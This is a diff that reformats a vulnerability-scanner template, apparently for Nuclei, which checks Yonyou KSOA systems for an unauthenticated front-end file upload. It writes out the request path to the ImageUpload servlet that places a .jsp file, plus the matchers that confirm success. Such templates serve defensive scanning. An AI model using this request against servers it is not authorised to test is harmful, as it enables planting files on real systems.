@@ -1,21 +1,23 @@
 id: yongyou-KSOA-upload
+
 info:
+  name: 用友KSOA前台文件上传
   author: str1am
-  name: "\u7528\u53CBKSOA\u524D\u53F0\u6587\u4EF6\u4E0A\u4F20"
   severity: critical
   tags: yongyou,upload
+
 requests:
-- matchers:
-  - status:
-    - 200
-    type: status
-  - condition: and
-    part: body
-    type: word
-    words:
-    - root
-    - ac59075b964b0715.jsp
-  matchers-condition: and
-  method: GET
-  path:
-  - '{{BaseURL}}/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=ac59075b964b0715.jsp'
+  - method: GET
+    path:
+      - "{{BaseURL}}/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=ac59075b964b0715.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root"
+          - "ac59075b964b0715.jsp"
+        part: body
+        condition: and
